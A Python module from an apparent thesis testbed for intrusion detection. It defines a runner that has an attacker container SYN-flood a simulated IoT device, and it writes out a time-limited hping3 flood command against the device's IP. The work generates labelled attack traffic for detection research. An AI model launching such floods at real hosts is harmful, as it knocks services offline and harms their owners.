"""Attack family F6: TCP SYN flood (E1-13; ADR-0003).

An external attacker host floods an IoT device D directly (not through the broker) with TCP
SYN packets, using hping3. The flood runs in the `attacker` container and addresses D by IP, on
a fixed destination port, for a fixed wall-clock duration (ADR-0003: `--syn --flood`, stopped by
time, not packet count). Expected sources: flows only (mqtt no, honeypot no) — the one-source
family, so H1 can separate "gain from fusion" from "gain from having a source at all".

Bounded by `timeout`, and the flood's termination is expected, so the command exits 0.
"""

from __future__ import annotations

from typing import Final

from thesis.scenario.families.base import DEVICE_SERVICE, SERVICE_IP, ContainerAttackRunner
from thesis.scenario.schedule import AttackFamily, Episode

DEST_PORT: Final = 80  # a non-MQTT port on the device (the device runs no listener there)
SRC_PORT: Final = 53535  # kept fixed (-k -s), see below
FLOOD_SECONDS: Final = 5  # fixed wall-clock duration


class SynFloodRunner(ContainerAttackRunner):
    family = AttackFamily.SYN_FLOOD

    def service_for(self, episode: Episode) -> str:
        from thesis.scenario.families.base import ATTACKER_SERVICE

        return ATTACKER_SERVICE

    def command(self, episode: Episode) -> str:
        seconds = int(episode.parameters.get("flood_seconds", FLOOD_SECONDS))
        port = int(episode.parameters.get("dest_port", DEST_PORT))
        src = int(episode.parameters.get("src_port", SRC_PORT))
        target_ip = SERVICE_IP[DEVICE_SERVICE[episode.target_device]]
        # The source port is kept fixed (-k -s), so the flood is one flow of many SYN packets
        # rather than one flow per packet (hping3's default increments the source port, which
        # produced ~12k flows/s and a 144 MB flow file). ADR-0003 fixes the destination port and
        # duration and leaves the source port open; see docs/families/F6.md. timeout bounds the
        # flood by wall clock; `|| true` makes the expected timeout kill a clean exit.
        return (
            f"timeout {seconds} hping3 --syn --flood -k -s {src} -p {port} "
            f"{target_ip} >/dev/null 2>&1 || true"
        )
